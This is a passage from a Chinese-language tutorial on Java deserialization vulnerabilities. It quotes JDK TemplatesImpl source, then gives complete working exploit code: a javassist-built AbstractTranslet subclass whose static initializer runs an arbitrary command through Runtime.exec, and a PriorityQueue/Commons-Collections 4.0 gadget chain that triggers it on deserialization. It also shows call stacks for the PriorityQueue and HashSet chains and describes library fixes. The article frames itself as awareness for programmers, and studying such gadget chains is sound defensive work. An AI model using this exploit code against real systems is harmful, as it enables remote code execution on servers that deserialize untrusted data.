            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setOverrideDefaultParser(_overrideDefaultParser);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }

    /**
    * Implements JAXP's Templates.newTransformer()
    *
    * @throws TransformerConfigurationException
    */
    public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
  }
  ```

  我们可以看到 TemplatesImpl 的 newTransformer 会从\_bytecodes 中将实例化一个类的对象，而该对象的类需要是 AbstractTranslet 的子类。因此我们可以得出这么一个利用的调用链条。

  1.  构建一个 AbstractTranslet 的子类，并在构造函数中写入我们的恶意方法
  2.  需要找到媒介来触发 newTransformer

  构造恶意代码如下

  ```java
    /**
    * 该类是用来创建一个带有 恶意代码类字节码 的类
    * 如果你可以先用其他的Java文件写好一个恶意代码,编译成.class后加载再进行处理就可以进行更多功能了
  * */
  public class XalanTemplate {

    //可以定义恶意代码的类
    public static class PlayLoad implements Serializable{ }

    //利用指定的命令来构建恶意对象
    public Object createTemplate(String command) throws Exception {
        //利用javassist 来获取和操作字节码
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(PlayLoad.class));
        CtClass clazz = pool.get(PlayLoad.class.getName());

        //利用javassist来给目标类动态构建一个指定的构造函数
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +"\");";
        clazz.makeClassInitializer().insertAfter(cmd);

        //设置该类的超类为 AbstractTranslet
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass superC = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superC);

        //获取字节码
        byte[] playLoadByteCode=clazz.toBytecode();

        //设置构建 template
        Object template=TemplatesImpl.class.newInstance();
        setFieldValue(template, "_bytecodes", new byte[][] {playLoadByteCode});
        setFieldValue(template, "_name", "lujianbo");
        setFieldValue(template, "_tfactory", TransformerFactoryImpl.class.newInstance());

        return template;
    }

    public Field getField(final Class<?> clazz, final String fieldName) throws Exception {
        Field field = clazz.getDeclaredField(fieldName);
        if (field != null)
            field.setAccessible(true);
        else if (clazz.getSuperclass() != null)
            field = getField(clazz.getSuperclass(), fieldName);
        return field;
    }

    public void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
  }
  ```

  关于该类的利用，我们在稍后的另一个目标宿主 PriorityQueue 中会提到,大家可以在稍后的代码中可以看到

* ### 目标宿主类

  | 名称                          | 使用条件                            |
  | ----------------------------- | ----------------------------------- |
  | AnnotationInvocationHandler   | 需要 jdk<=8u66                      |
  | BadAttributeValueExpException | System.getSecurityManager() == null |
  | PriorityQueue                 |                                     |
  | HashSet                       |                                     |

  在前文中，我们都已经详细介绍了 AnnotationInvocationHandler 和 BadAttributeValueExpException 两个宿主了,然而可以作为宿主的类依然还是不少，因而我们再多介绍两个

  **PriorityQueue**

  PriorityQueue 是一个有序队列,主要的功能是利用一个特定的排序方法，使得队列中的对象按照一定的顺序排布,同样的 PriorityQueue 的 readObject 方法中，在反序列化的时候需要调用自身的排序对象来对队列中的对象尽心排序，因此将 PriorityQueue 的排序器进行篡改，就是我们的突破点。

  以上述的 XalanTemplate 作为恶意代码,利用 PriorityQueue 做宿主，依靠 Commons-Collections 4.0 其中的几个类作为媒介，我们可以构造如下的攻击代码

  ```java
  public class XalanTest {

    public static void main(String[] args) throws Exception {
        XalanTest test = new XalanTest();
        test.run();
    }

    public void run() throws Exception {
        deserialize(serialize(getObject()));
    }

    //在此方法中返回恶意对象
    public Object getObject() throws Exception {
        //得到恶意代码
        Object template = createTemplate("calc.exe");

        //InvokerTransformer 中Method在此处需要先构建成ToString,因为在后续的queue.add会用到
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        //随便放两个元素进去
        queue.add(1);
        queue.add(1);

        //把InvokerTransformer的方法修改为 我们真正想调用的 newTransformer
        setFieldValue(transformer, "iMethodName", "newTransformer");

        //把我们的Template 放到 queue的array中去,这样就可以被 newTransformer调用到
        final Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = template;
        queueArray[1] = 1;

        return queue;
    }

    public byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        return out.toByteArray();
    }

    public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }

    public static class PlayLoad implements Serializable {

    }

    public Object createTemplate(String command) throws Exception {

        //利用javassist 来获取和操作字节码
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(PlayLoad.class));
        CtClass clazz = pool.get(PlayLoad.class.getName());

        //利用javassist来给目标类动态构建一个指定的构造函数
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") + "\");";
        clazz.makeClassInitializer().insertAfter(cmd);

        //设置该类的超类为 AbstractTranslet
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass superC = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superC);

        //获取字节码
        byte[] playLoadByteCode = clazz.toBytecode();

        //设置构建 template
        Object template = TemplatesImpl.class.newInstance();
        setFieldValue(template, "_bytecodes", new byte[][]{playLoadByteCode});
        setFieldValue(template, "_name", "lujianbo");
        setFieldValue(template, "_tfactory", TransformerFactoryImpl.class.newInstance());

        return template;
    }

    public Field getField(final Class<?> clazz, final String fieldName) throws Exception {
        Field field = clazz.getDeclaredField(fieldName);
        if (field != null)
            field.setAccessible(true);
        else if (clazz.getSuperclass() != null)
            field = getField(clazz.getSuperclass(), fieldName);
        return field;
    }

    public void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
  }
  ```

  整个调用堆栈如下所示,大家可以,在关键代码处设置断点来进行观察

  ```text
  newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
  invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
  invoke:62, NativeMethodAccessorImpl (sun.reflect)
  invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
  invoke:498, Method (java.lang.reflect)
  transform:129, InvokerTransformer (org.apache.commons.collections4.functors)
  compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
  siftDownUsingComparator:722, PriorityQueue (java.util)
  siftDown:688, PriorityQueue (java.util)
  heapify:737, PriorityQueue (java.util)
  readObject:797, PriorityQueue (java.util)
  invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
  invoke:62, NativeMethodAccessorImpl (sun.reflect)
  invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
  invoke:498, Method (java.lang.reflect)
  invokeReadObject:1158, ObjectStreamClass (java.io)
  readSerialData:2169, ObjectInputStream (java.io)
  readOrdinaryObject:2060, ObjectInputStream (java.io)
  readObject0:1567, ObjectInputStream (java.io)
  readObject:427, ObjectInputStream (java.io)
  ```

  HashSet

  HashSet 是大家常见的一个类了，几乎每一个程序员都认识，但是 HashSet 的 readObject 方法却同样可以被我们利用攻击代码的调用堆栈如下，更具体的代码可以在 [ysoserial](https://github.com/frohoff/ysoserial)的代码中看到

  ```text
  transform:121, ChainedTransformer (org.apache.commons.collections.functors)
  get:151, LazyMap (org.apache.commons.collections.map)
  getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
  hashCode:120, TiedMapEntry (org.apache.commons.collections.keyvalue)
  hash:339, HashMap (java.util)
  put:612, HashMap (java.util)
  readObject:342, HashSet (java.util)
  invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
  invoke:62, NativeMethodAccessorImpl (sun.reflect)
  invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
  invoke:498, Method (java.lang.reflect)
  invokeReadObject:1158, ObjectStreamClass (java.io)
  readSerialData:2169, ObjectInputStream (java.io)
  readOrdinaryObject:2060, ObjectInputStream (java.io)
  readObject0:1567, ObjectInputStream (java.io)
  readObject:427, ObjectInputStream (java.io)
  ```

## 具体攻击实例

Java 的反序列化漏洞影响广泛,可以触发的条件众多，但是在实际攻击的过程中，极少会有一个系统直接从外部读取一个对象,因此为了让攻击生效，我们依然需要针对不同的系统漏洞，继续包装我们序列化之后的对象二进制文件。

因为具体的攻击已经不再属于 Java 反序列化漏洞的范畴，因此我们不再展开，有兴趣的读者可以参照如下文章进行学习。
[Apache Shiro Java 反序列化漏洞分析](http://blog.knownsec.com/2016/08/apache-shiro-java/)
该漏洞的关键是 apache shiro 在 remeberMe 的功能中，将一个 java 对象序列化后加密作为 cookie 的一部分，我们可以将其等同于在 cookie 中反序列话出一个 java 对象，符合了我们的攻击场景。

## 社区修复方案介绍

Java 反序列化漏洞经过披露后，官方和开源库的作者都进行了修复，其中不同的环节修复的方式不同，宿主类目前只有 AnnotationInvocationHandler 修复了代码，修改了 setValue 的行为。
而在本文写作的时候 BadAttributeValueExpException PriorityQueue HashSet 都可以继续使用，或许在官方看来，这几个类的写法是完全正确的，这也是我们说 大部分的"宿主"是无辜的原因。

Apache Commons-collections 3.1 的修复方案是

在 InvokerTransformer 进行反序列化之前进行一个安全检查，通过检查系统参数来确保是否允许反序列化,默认为不允许

Apache Commons-collections4 4.1 的修复方案是

移除了 InvokerTransformer 类的 Serializable 接口，使得恶意代码无法被序列化

## 总结

Java 的反序列化漏洞影响深远，范围广泛，本文仅仅列出其中的部分漏洞方式，主要的目的是详细阐述该漏洞产生的原因和利用方式，主要的目的是给广大的 Java 程序员予以启示，使得大家在构建一个系统的时候，需要更多地去注意相关的安全问题。
